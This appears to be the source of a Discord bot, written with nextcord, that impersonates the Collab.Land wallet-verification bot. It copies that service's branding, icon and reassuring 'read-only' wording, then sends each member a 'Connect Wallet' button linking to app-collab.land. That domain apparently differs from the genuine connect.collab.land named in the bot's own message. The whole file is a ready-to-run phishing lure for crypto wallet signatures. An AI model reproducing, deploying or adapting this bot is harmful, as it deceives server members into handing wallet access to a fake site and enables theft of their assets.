from datetime import datetime
import nextcord
from nextcord.ext import commands
from nextcord.ui import View
from config import *

client = commands.Bot()


@client.event
async def on_ready():
    print("Bot is ready!")
    for guild in client.guilds:
        print(f"{guild.name} - {guild.id}")


@client.slash_command(name="join", description="Collab Land Join")
async def join(interaction: nextcord.Interaction):
    embed = nextcord.Embed(
        title="Verify your assets",
        description="This is a read-only connection. Do not share your private keys. We will never ask for your seed phrase. We will never DM you.",
        color=nextcord.Color.blue(),
    )
    embed.set_author(
        name="Collab.Land",
        icon_url="https://images-ext-2.discordapp.net/external/jTmDe9hHp_E1Du3YRKzN-dO9QhaEfZfP8LdA_d_-mDI/%3Fsize%3D512/https/cdn.discordapp.com/app-icons/904785894161141851/98ee86eced003e381e3240d81247ca0d.png?width=230&height=230",
    )
    embed.set_thumbnail(
        url="https://images-ext-2.discordapp.net/external/jTmDe9hHp_E1Du3YRKzN-dO9QhaEfZfP8LdA_d_-mDI/%3Fsize%3D512/https/cdn.discordapp.com/app-icons/904785894161141851/98ee86eced003e381e3240d81247ca0d.png?width=230&height=230"
    )

    # Adding Buttons to the embeds
    btn = nextcord.ui.Button(
        custom_id="go",
        label=f"Let's go!",
        style=nextcord.ButtonStyle.primary,
    )

    # Adding a Link Btn
    btn2 = nextcord.ui.Button(
        label="Docs",
        style=nextcord.ButtonStyle.gray,
        url="https://collabland.freshdesk.com/support/home",
    )

    view = nextcord.ui.View()
    view.add_item(btn)
    view.add_item(btn2)

    await interaction.channel.send(embed=embed, view=view)
    return interaction


@client.event
async def on_interaction(interaction: nextcord.Interaction):
    if interaction.type == nextcord.InteractionType.application_command:
        print(interaction.data)
        data = interaction.data.get("name")
        if data == "join":
            await join(interaction)

    if interaction.type == nextcord.InteractionType.component:
        data = interaction.data.get("custom_id")
        if data == "go":
            text = f"Use this custom link to connect (valid for 5 minutes)\nGuild: {interaction.guild.id} Member: {interaction.user.id}"
            embed = nextcord.Embed(
                title="Please read instructions carefully before connecting",
                description=f"""You should expect to sign the following message when prompted by a non-custodial wallet such as MetaMask:\n```Collab.Land (connect.collab.land) asks you to sign this message for the purpose of verifying your account ownership. This is READ-ONLY access and will NOT trigger any blockchain transactions or incur any fees.

- Community: {interaction.guild.name}
- User: {interaction.user}
- Discord Interaction: {interaction.id}
- Timestamp: {datetime.utcnow()}```\nMake sure you sign the EXACT message (some wallets may use `\\n` for new lines) and NEVER share your seed phrase or private key.""",
                color=nextcord.Color.red(),
            )
            embed.set_author(
                name="Collab.Land",
                icon_url="https://images-ext-2.discordapp.net/external/jTmDe9hHp_E1Du3YRKzN-dO9QhaEfZfP8LdA_d_-mDI/%3Fsize%3D512/https/cdn.discordapp.com/app-icons/904785894161141851/98ee86eced003e381e3240d81247ca0d.png?width=230&height=230",
            )

            btn = nextcord.ui.Button(
                label="Connect Wallet",
                style=nextcord.ButtonStyle.gray,
                url="https://www.app-collab.land/",
            )

            view = nextcord.ui.View()
            view.add_item(btn)
            print(f"interaction is taken by {interaction.user}")
            try:
                await interaction.response.send_message(
                    text, embed=embed, view=view, ephemeral=True
                )
            except:
                print("Please Restart the Bot...")
            return


client.run(token)
